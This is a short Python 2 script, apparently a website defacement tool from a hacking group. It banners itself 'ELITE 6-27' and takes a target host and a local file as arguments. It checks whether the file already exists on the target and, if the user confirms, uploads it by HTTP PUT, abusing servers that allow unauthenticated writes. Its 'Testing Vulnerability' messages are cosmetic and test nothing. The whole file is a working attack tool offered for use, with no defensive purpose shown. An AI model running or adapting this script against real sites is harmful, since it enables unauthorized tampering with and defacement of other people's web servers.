#!/usr/bin/python

import requests
import string
import random
import sys
import os

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'

os.system("clear")

print(GREEN+"""

 _____ _     ___ _____ _____    __        ____ _____
| ____| |   |_ _|_   _| ____|  / /_      |___ \___  |
|  _| | |    | |  | | |  _|   | '_ \ _____ __) | / /
| |___| |___ | |  | | | |___  | (_) |_____/ __/ / /
|_____|_____|___| |_| |_____|  \___/     |_____/_/

      
      [*] BY        VIRXZ-SLXW
      [*] ORG       ELITE 6-27
      [*] GITHUB    github.com/v1rxz
      [*] VERSION   v1.3 
                                         """)

def defaceweb():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Upload File : %s") % (sys.argv[2])
  print("[*] Uploading %r bytes, Script") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print(RED+"[!] Upload failed . . .")
    sys.exit(1)
  else:
    print(YELLOW+"[+] File uploaded . . .")
    print(GREEN+"[+] PATH : "+host + nama)


def cekfile():

 print("[*] Chek File URL : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print(YELLOW+"[*] File Already Exists  . . .")
  tanya = raw_input(RED+"[!] Replace File  ? [Y/N] > ")
  if tanya == "Y":
   defaceweb()
  else:
   print("[!] Exiting Tools . . .")
   sys.exit()
 else:
   print(YELLOW+"[*] Checking information  . . .")
   print(YELLOW+"[*] Testing Vulnerability . . .")
   print(YELLOW+"[*] Proses Upload Script  . . .")
   defaceweb()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print(BLUE+"\n[*] "+sys.argv[0]+" Target.com virxz-slxw.html\n")
    sys.exit(0)
  else:
    cekfile()
